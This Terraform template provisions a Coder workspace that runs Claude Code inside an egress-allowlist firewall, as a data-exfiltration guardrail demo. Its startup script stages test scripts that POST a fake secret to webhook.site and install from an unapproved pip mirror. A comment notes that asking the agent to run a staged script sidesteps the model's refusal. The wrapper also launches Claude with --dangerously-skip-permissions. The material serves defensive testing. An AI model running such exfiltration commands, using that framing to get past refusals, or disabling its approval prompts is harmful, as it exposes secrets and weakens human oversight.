# =============================================================================
# Firewalled Claude Code on Coder Agents, GovCloud demo workspace template
# =============================================================================
# Claude Code runs inside a process-level network egress jail
# (landjail / Landlock LSM) that enforces an HTTP(S) allowlist. The agent
# can reach the in-boundary AI Gateway and the in-cluster GitLab, and every
# other egress is denied and audit-logged. This is the data-exfil / DLP
# guardrail story for the AOI.
#
# Install method (adapted from the Red Hat Summit 2026 demo,
# coder/demo-aigov-rhaiis-rhsummit-2026): everything is done directly in the
# agent startup_script, NOT via the claude-code registry module.
#   1. Claude Code CLI: native install into ~/.local/bin
#      (curl https://claude.ai/install.sh | bash -s -- stable).
#   2. boundary (Coder Agent Firewall): standalone binary
#      (curl .../coder/boundary/main/install.sh | bash).
#   3. Allowlist written to ~/.config/coder_boundary/config.yaml, rendered
#      from the sibling boundary.config.yaml.tftpl.
#   4. ~/.claude/settings.json + ~/.claude.json pre-seeded so first-run
#      onboarding / trust dialogs are skipped and the AI Gateway endpoint is
#      already configured.
#   5. A boundary wrapper at ~/.local/bin/boundary-wrappers/claude exec's
#      `boundary --config <cfg> --jail-type landjail -- <real claude>
#      --dangerously-skip-permissions "$@"`. The wrappers dir is prepended
#      to PATH in the shell rc files, so `claude` is jailed by default.
#      `--dangerously-skip-permissions` is what removes Claude's interactive
#      permission / bypass-mode prompts: boundary IS the security boundary
#      here, so the per-tool approval prompts are redundant friction.
#
# There is intentionally NO AgentAPI / Coder Tasks wiring in this template.
# Claude Code is driven interactively from the workspace terminal (or
# code-server), wrapped by boundary. Codex/OpenAI is also intentionally
# omitted: this is a Claude-only firewall demo.
#
# Allowlist (boundary.config.yaml.tftpl): Claude Code's default allowed
# domains (package managers, GitHub, container registries, cloud SDKs) plus
# this deployment's Coder host and the in-cluster GitLab. npm is
# intentionally omitted so `npm install` is the obvious DENY in the demo.
# jail_type landjail needs no added pod capabilities (AL2023 kernel exceeds
# the Landlock 6.7 floor; landlock is in the node LSM stack).
#
# AI access: Claude Code authenticates through the Coder AI Gateway (AI
# Bridge) using the workspace owner's session token, so the workspace never
# holds a raw Anthropic key. ANTHROPIC_BASE_URL points at
# <access_url>/api/v2/aibridge/anthropic and CLAUDE_API_KEY /
# ANTHROPIC_AUTH_TOKEN carry the session token.
#
# See README.md for the end-to-end AI Gateway wiring and cluster
# prerequisites (namespace + provisioner RBAC).
# =============================================================================

terraform {
  required_providers {
    coder = {
      source = "coder/coder"
    }
    kubernetes = {
      source  = "hashicorp/kubernetes"
      version = ">= 2.23"
    }
  }
}

# -----------------------------------------------------------------------------
# Providers
# -----------------------------------------------------------------------------

provider "coder" {}

variable "use_kubeconfig" {
  type        = bool
  description = "Use a host kubeconfig instead of in-cluster config. Leave false when the Coder provisioner runs inside the cluster."
  default     = false
}

variable "namespace" {
  type        = string
  description = "Kubernetes namespace that hosts workspace pods. The platform layer must create this namespace and grant the provisioner RBAC (see README)."
  default     = "coder-workspaces"
}

# Workspace container image (ECR mirror).
#
# Upstream ref : docker.io/codercom/enterprise-base:ubuntu-noble-20260601
# ECR mirror   : per deploy/CONVENTIONS.md the docker.io -> ECR mapping is
#                docker.io/<repo>:<tag> -> <registry>/docker-hub/<repo>:<tag>
#
# codercom/enterprise-base is Coder's maintained Kubernetes workspace base
# image: runs as user `coder` (uid 1000), ships git/curl/sudo, and is the
# canonical base for Coder's official Kubernetes template. Claude Code and
# boundary install as standalone binaries (Claude into $HOME/.local/bin,
# boundary into /usr/local/bin via sudo), so no Node.js/npm is required in
# the base image.
variable "workspace_image" {
  type        = string
  description = "Fully-qualified workspace image. Defaults to the ECR-mirrored codercom/enterprise-base."
  default     = "430737322961.dkr.ecr.us-gov-west-1.amazonaws.com/docker-hub/codercom/enterprise-base:ubuntu-noble-20260601"
}

provider "kubernetes" {
  config_path = var.use_kubeconfig ? "~/.kube/config" : null
}

data "coder_provisioner" "me" {}
data "coder_workspace" "me" {}
data "coder_workspace_owner" "me" {}

# -----------------------------------------------------------------------------
# Git external auth: in-cluster GitLab (in-boundary)
# -----------------------------------------------------------------------------
# Every workspace authenticates git against the in-cluster GitLab through
# Coder's external-auth provider `gitlab` (configured on the Coder server, see
# deploy/coder/values.yaml CODER_EXTERNAL_AUTH_0_*). Declaring this data source
# makes the workspace REQUIRE a GitLab login: the dashboard surfaces a "Login
# with GitLab" control and the agent only reports the auth as satisfied once
# the owner has completed the OAuth flow. The Coder agent's git credential
# helper then injects the short-lived OAuth token for any clone/fetch/push to
# gitlab.usgov.coderdemo.io. No PATs or SSH keys live in the workspace, and no
# auth path leaves the GovCloud boundary.
#
# id MUST match CODER_EXTERNAL_AUTH_0_ID on the Coder server ("gitlab").
data "coder_external_auth" "gitlab" {
  id = "gitlab"
}

# -----------------------------------------------------------------------------
# Parameters: sizing
# -----------------------------------------------------------------------------

data "coder_parameter" "cpu" {
  name         = "cpu"
  display_name = "CPU Cores"
  description  = "CPU limit for the workspace pod."
  type         = "number"
  default      = "4"
  mutable      = true
  icon         = "/icon/memory.svg"

  option {
    name  = "2 Cores"
    value = "2"
  }
  option {
    name  = "4 Cores"
    value = "4"
  }
  option {
    name  = "8 Cores"
    value = "8"
  }
}

data "coder_parameter" "memory" {
  name         = "memory"
  display_name = "Memory (GB)"
  description  = "Memory limit for the workspace pod."
  type         = "number"
  default      = "8"
  mutable      = true
  icon         = "/icon/memory.svg"

  option {
    name  = "4 GB"
    value = "4"
  }
  option {
    name  = "8 GB"
    value = "8"
  }
  option {
    name  = "16 GB"
    value = "16"
  }
}

data "coder_parameter" "disk_size" {
  name         = "disk_size"
  display_name = "Disk Size (GB)"
  description  = "Persistent /home/coder volume size. Cannot be changed after creation."
  type         = "number"
  default      = "20"
  mutable      = false
  icon         = "/icon/database.svg"

  option {
    name  = "10 GB"
    value = "10"
  }
  option {
    name  = "20 GB"
    value = "20"
  }
  option {
    name  = "50 GB"
    value = "50"
  }
}

locals {
  # AI Gateway (AI Bridge) Anthropic endpoint, proxied through Coder and
  # authenticated with the workspace owner's session token.
  ai_gateway_anthropic_url = "${data.coder_workspace.me.access_url}/api/v2/aibridge/anthropic"

  # Coder access URL host, substituted into the boundary allowlist so the
  # agent can reach the AI Gateway and the workspace agent.
  coder_host = replace(replace(data.coder_workspace.me.access_url, "https://", ""), "http://", "")

  # Agent firewall allowlist, rendered from the sibling
  # boundary.config.yaml.tftpl (adapted from the Red Hat Summit 2026 demo).
  # Edit that file to change the allowlist; do not inline rules here.
  boundary_config_yaml = templatefile("${path.module}/boundary.config.yaml.tftpl", {
    coder_host = local.coder_host
  })

  # Claude Code settings.json, written to ~/.claude/settings.json. Sets the
  # AI Gateway endpoint, the git author/committer identity (no secrets: the
  # GitLab OAuth token is injected by Coder's git credential helper, never
  # written to the workspace), and onboarding flags so the CLI starts
  # without the first-run prompts.
  claude_settings = {
    env = {
      ANTHROPIC_BASE_URL  = local.ai_gateway_anthropic_url
      GIT_AUTHOR_NAME     = coalesce(data.coder_workspace_owner.me.full_name, data.coder_workspace_owner.me.name)
      GIT_AUTHOR_EMAIL    = data.coder_workspace_owner.me.email
      GIT_COMMITTER_NAME  = coalesce(data.coder_workspace_owner.me.full_name, data.coder_workspace_owner.me.name)
      GIT_COMMITTER_EMAIL = data.coder_workspace_owner.me.email
    }
    autoUpdaterStatus            = "disabled"
    hasAcknowledgedCostThreshold = true
    hasCompletedOnboarding       = true
  }

  # Claude Code config, written to ~/.claude.json. Carries per-project
  # onboarding/trust state so the workspace dir is trusted on first launch.
  # Auth is NOT set here: the AI Gateway credential is ANTHROPIC_AUTH_TOKEN
  # (set via coder_env below). Setting a primaryApiKey here too would make
  # Claude Code see both a bearer token and a "/login managed key" and warn
  # about an auth conflict.
  claude_config = {
    autoUpdaterStatus            = "disabled"
    hasAcknowledgedCostThreshold = true
    hasCompletedOnboarding       = true
    projects = {
      "/home/coder" = {
        hasCompletedProjectOnboarding = true
        hasTrustDialogAccepted        = true
      }
    }
  }
}

# -----------------------------------------------------------------------------
# Agent
# -----------------------------------------------------------------------------

resource "coder_agent" "main" {
  arch = data.coder_provisioner.me.arch
  os   = "linux"

  # The startup script runs on every workspace start. It:
  #   1. Installs Claude Code (native, ~/.local/bin) and boundary.
  #   2. Writes the boundary allowlist config.
  #   3. Writes Claude Code config (settings.json + .claude.json).
  #   4. Generates the boundary wrapper for `claude` and prepends the
  #      wrappers dir to PATH in the shell rc files.
  #   5. Stages operator firewall smoke-test scripts under ~/demo/.
  startup_script = <<-EOT
    #!/bin/bash
    touch ~/.bashrc

    # Native installs land in ~/.local/bin. Put it on PATH for this script
    # and for future login shells.
    export PATH="$HOME/.local/bin:$PATH"
    grep -qF "$HOME/.local/bin" ~/.profile 2>/dev/null || \
      echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.profile

    # Install Claude Code CLI (native install into ~/.local/bin).
    # Installer syntax: bash -s -- [stable|latest|VERSION]. `stable` tracks
    # the current stable channel; pin a VERSION here for a reproducible build.
    echo "Installing Claude Code CLI (stable)..."
    curl -fsSL https://claude.ai/install.sh | bash -s -- stable || echo "Warning: Claude Code install failed"

    # Install Coder Agent Firewall (boundary). The standalone binary has no
    # license/login dependency, unlike the `coder boundary` subcommand which
    # needs a logged-in CLI session (the agent only carries an agent token).
    echo "Installing Agent Firewall (boundary)..."
    curl -fsSL https://raw.githubusercontent.com/coder/boundary/main/install.sh | bash || echo "Warning: boundary install failed"

    # Write boundary allowlist to ~/.config/coder_boundary/config.yaml.
    # boundary v0.9.0 does NOT auto-discover this path: the wrapper passes
    # --config explicitly and BOUNDARY_CONFIG is set on the agent (coder_env)
    # so direct `boundary -- <cmd>` calls also load the allowlist. The
    # base64 round-trip keeps the multi-line YAML intact inside the heredoc.
    echo "Configuring Agent Firewall..."
    mkdir -p ~/.config/coder_boundary /tmp/boundary_logs
    echo '${base64encode(local.boundary_config_yaml)}' | base64 -d > ~/.config/coder_boundary/config.yaml
    chmod 600 ~/.config/coder_boundary/config.yaml

    # Claude Code configuration: settings.json (AI Gateway env + onboarding
    # flags) and .claude.json (session-token primaryApiKey + project trust).
    echo "Configuring Claude Code..."
    mkdir -p ~/.claude
    cat > ~/.claude/settings.json << 'CLAUDESETTINGS'
    ${jsonencode(local.claude_settings)}
    CLAUDESETTINGS
    cat > ~/.claude.json << 'CLAUDECONFIG'
    ${jsonencode(local.claude_config)}
    CLAUDECONFIG

    # Boundary wrapper: make `claude` resolve to a boundary-jailed launcher.
    # The wrapper exec's `boundary --config <cfg> --jail-type landjail --
    # <real claude> --dangerously-skip-permissions "$@"`. Prepending the
    # wrappers dir to PATH means `claude` hits the wrapper first; the real
    # binary is still reachable by absolute path (e.g.
    # /home/coder/.local/bin/claude) for debugging.
    #   --config: boundary v0.9.0 doesn't auto-discover the allowlist path.
    #   --jail-type landjail: use the Landlock LSM (no network namespace,
    #     iptables, or added capabilities) rather than the nsjail default.
    #   --dangerously-skip-permissions: boundary IS the security boundary, so
    #     Claude's interactive permission / bypass-mode prompts are removed.
    echo "Installing boundary wrapper for claude..."
    WRAPPERS_DIR="$HOME/.local/bin/boundary-wrappers"
    mkdir -p "$WRAPPERS_DIR"
    REAL_CLAUDE="$(command -v claude 2>/dev/null || true)"
    if [ -n "$REAL_CLAUDE" ]; then
      printf '#!/usr/bin/env bash\nexec boundary --config "$HOME/.config/coder_boundary/config.yaml" --jail-type landjail -- %q --dangerously-skip-permissions "$@"\n' "$REAL_CLAUDE" > "$WRAPPERS_DIR/claude"
      chmod +x "$WRAPPERS_DIR/claude"
      echo "  claude -> boundary -- $REAL_CLAUDE --dangerously-skip-permissions"
    else
      echo "  skip claude wrapper (claude not installed)"
    fi

    # Prepend the wrappers dir to PATH in every common interactive shell rc
    # so `claude` runs jailed by default. BOUNDARY_CONFIG / BOUNDARY_JAIL_TYPE
    # are set on the agent (coder_env) so they cover non-login shells too.
    for RC in "$HOME/.profile" "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.zprofile"; do
      touch "$RC"
      grep -qF 'boundary-wrappers' "$RC" || \
        echo 'export PATH="$HOME/.local/bin/boundary-wrappers:$PATH"' >> "$RC"
    done

    # Pre-stage operator firewall smoke-test scripts so a demo operator can
    # verify boundary is in the network path. Each runs a deliberately
    # off-allowlist request that boundary should drop. Asking the agent to
    # "run this script" sidesteps the model's refusal path: it isn't crafting
    # an exfil command, it's running a file the operator already placed.
    echo "Staging Agent Firewall demo scripts..."
    mkdir -p "$HOME/demo"

    cat > "$HOME/demo/exfil-test.sh" << 'EXFILDEMO'
    #!/usr/bin/env bash
    # Attempts a POST to webhook.site. Host is NOT on the Agent Firewall
    # allowlist, so boundary drops the connection and the script fails. Run
    # via: boundary -- ~/demo/exfil-test.sh (or ask an agent to run it).
    set -e
    UUID="$(uuidgen 2>/dev/null || date +%s)"
    echo "Attempting POST to https://webhook.site/$UUID ..."
    curl -sS -X POST -d 'SECRET=fake-api-key-abc123' "https://webhook.site/$UUID"
    echo
    echo "Unexpected: POST succeeded. Is boundary in PATH?"
    EXFILDEMO
    chmod +x "$HOME/demo/exfil-test.sh"

    cat > "$HOME/demo/unknown-registry-test.sh" << 'PIPDEMO'
    #!/usr/bin/env bash
    # Attempts a pip install from an index URL that isn't on the allowlist.
    # Boundary drops the connection; pip fails with a resolver error.
    # Simulates a typosquat / malicious-mirror attack.
    set -e
    echo "Attempting pip install from unapproved mirror..."
    pip install --dry-run --index-url https://unknown-pypi.example.com/simple suspicious-pkg
    echo "Unexpected: resolver succeeded. Is boundary installed?"
    PIPDEMO
    chmod +x "$HOME/demo/unknown-registry-test.sh"

    cat > "$HOME/demo/README.md" << 'DEMOREADME'
    # Operator firewall smoke tests

    These scripts let a demo operator verify boundary is in the network path
    BEFORE walking an audience through the agent-facing parts of the demo.
    Tail /tmp/boundary_logs/ in another terminal to watch DENY events land.

    ## ~/demo/exfil-test.sh
    POST to webhook.site (NOT on the allowlist). Boundary drops the
    connection; curl fails. Expected exit code != 0.

    ## ~/demo/unknown-registry-test.sh
    pip install from a non-allowlisted --index-url. Boundary drops the
    resolver request; pip fails. Expected exit code != 0.

    ## Test the inverse (allowed hosts)
    Run, from the same terminal:

      curl -sI https://api.github.com | head -1      # expect HTTP/2 200
      pip install --dry-run requests                 # expect success
    DEMOREADME

    echo "=== Workspace ready ==="
  EOT

  env = {
    EDITOR = "code"
    VISUAL = "code"

    # AI Gateway (AI Bridge) Anthropic endpoint. Claude Code reads
    # ANTHROPIC_BASE_URL to know where to send requests; ANTHROPIC_API_BASE
    # is the same value for clients that read that name instead.
    ANTHROPIC_BASE_URL = local.ai_gateway_anthropic_url
    ANTHROPIC_API_BASE = local.ai_gateway_anthropic_url

    # No docker socket in the pod; opt out of devcontainer auto-detection
    # so the dashboard does not hang polling `docker ps`.
    CODER_AGENT_DEVCONTAINERS_ENABLE = "false"
  }

  metadata {
    display_name = "CPU Usage"
    key          = "cpu_usage"
    script       = "coder stat cpu"
    interval     = 10
    timeout      = 1
  }

  metadata {
    display_name = "Memory Usage"
    key          = "mem_usage"
    script       = "coder stat mem"
    interval     = 10
    timeout      = 1
  }

  metadata {
    display_name = "Disk Usage"
    key          = "disk_usage"
    script       = "coder stat disk --path /home/coder"
    interval     = 60
    timeout      = 1
  }

  display_apps {
    vscode                 = true
    vscode_insiders        = false
    web_terminal           = true
    ssh_helper             = true
    port_forwarding_helper = true
  }
}

# -----------------------------------------------------------------------------
# AI Gateway client auth
# -----------------------------------------------------------------------------
# Claude Code authenticates to the AI Gateway with the workspace owner's
# session token (no raw Anthropic key in the workspace). ANTHROPIC_AUTH_TOKEN
# is the single credential, matching the AI Gateway client contract in
# deploy/CONVENTIONS.md (ANTHROPIC_BASE_URL + ANTHROPIC_AUTH_TOKEN). We do
# NOT also set CLAUDE_API_KEY or a ~/.claude.json primaryApiKey: Claude Code
# treats the env token as a bearer token and an API key / managed key as a
# separate credential, and warns "Auth conflict" when both are present.
resource "coder_env" "anthropic_auth_token" {
  agent_id = coder_agent.main.id
  name     = "ANTHROPIC_AUTH_TOKEN"
  value    = data.coder_workspace_owner.me.session_token
}

# -----------------------------------------------------------------------------
# Agent firewall env
# -----------------------------------------------------------------------------
# boundary v0.9.0 no longer auto-discovers ~/.config/coder_boundary/config.yaml,
# so point it at the rendered config explicitly and pin landjail. These env
# vars are read by any `boundary -- <cmd>` run in a workspace terminal,
# including direct invocations that don't go through the claude wrapper.
resource "coder_env" "boundary_config" {
  agent_id = coder_agent.main.id
  name     = "BOUNDARY_CONFIG"
  value    = "/home/coder/.config/coder_boundary/config.yaml"
}

resource "coder_env" "boundary_jail_type" {
  agent_id = coder_agent.main.id
  name     = "BOUNDARY_JAIL_TYPE"
  value    = "landjail"
}

# -----------------------------------------------------------------------------
# Coder registry modules
# -----------------------------------------------------------------------------

# code-server: VS Code in the browser (an additional coder_app tile).
module "code_server" {
  count     = data.coder_workspace.me.start_count
  source    = "registry.coder.com/coder/code-server/coder"
  version   = "1.3.1"
  agent_id  = coder_agent.main.id
  folder    = "/home/coder"
  subdomain = true
  order     = 1
}

# -----------------------------------------------------------------------------
# Kubernetes resources
# -----------------------------------------------------------------------------

resource "kubernetes_persistent_volume_claim_v1" "home" {
  metadata {
    name      = "coder-${data.coder_workspace.me.id}-home"
    namespace = var.namespace
    labels = {
      "app.kubernetes.io/name"     = "coder-workspace"
      "app.kubernetes.io/instance" = "coder-${data.coder_workspace.me.id}"
      "app.kubernetes.io/part-of"  = "coder"
    }
  }
  wait_until_bound = false
  spec {
    access_modes = ["ReadWriteOnce"]
    resources {
      requests = {
        storage = "${data.coder_parameter.disk_size.value}Gi"
      }
    }
  }

  lifecycle {
    ignore_changes = all
  }
}

resource "kubernetes_pod_v1" "workspace" {
  count = data.coder_workspace.me.start_count

  metadata {
    name      = "coder-${data.coder_workspace.me.id}"
    namespace = var.namespace
    labels = {
      "app.kubernetes.io/name"     = "coder-workspace"
      "app.kubernetes.io/instance" = "coder-${data.coder_workspace.me.id}"
      "app.kubernetes.io/part-of"  = "coder"
    }
  }

  spec {
    # enterprise-base runs as the `coder` user (uid/gid 1000).
    security_context {
      run_as_user = 1000
      fs_group    = 1000
    }

    container {
      name              = "dev"
      image             = var.workspace_image
      image_pull_policy = "IfNotPresent"
      command           = ["sh", "-c", coder_agent.main.init_script]

      security_context {
        run_as_user = 1000
        # enterprise-base grants the coder user passwordless sudo. The
        # boundary install.sh places the boundary binary in /usr/local/bin
        # via sudo, which requires privilege escalation. Disabling it sets
        # the kernel no_new_privs flag and breaks that install.
        allow_privilege_escalation = true
      }

      env {
        name  = "CODER_AGENT_TOKEN"
        value = coder_agent.main.token
      }

      env {
        name  = "CODER_AGENT_URL"
        value = data.coder_workspace.me.access_url
      }

      resources {
        requests = {
          "cpu"    = "500m"
          "memory" = "${max(2, floor(data.coder_parameter.memory.value / 2))}Gi"
        }
        limits = {
          "cpu"    = "${data.coder_parameter.cpu.value}"
          "memory" = "${data.coder_parameter.memory.value}Gi"
        }
      }

      volume_mount {
        mount_path = "/home/coder"
        name       = "home"
        read_only  = false
      }
    }

    volume {
      name = "home"
      persistent_volume_claim {
        claim_name = kubernetes_persistent_volume_claim_v1.home.metadata[0].name
      }
    }

    affinity {
      pod_anti_affinity {
        preferred_during_scheduling_ignored_during_execution {
          weight = 1
          pod_affinity_term {
            topology_key = "kubernetes.io/hostname"
            label_selector {
              match_expressions {
                key      = "app.kubernetes.io/name"
                operator = "In"
                values   = ["coder-workspace"]
              }
            }
          }
        }
      }
    }
  }

  # The agent token is baked into init_script; ignore_changes keeps a
  # running pod intact across template re-applies / prebuild claims.
  lifecycle {
    ignore_changes = all
  }
}
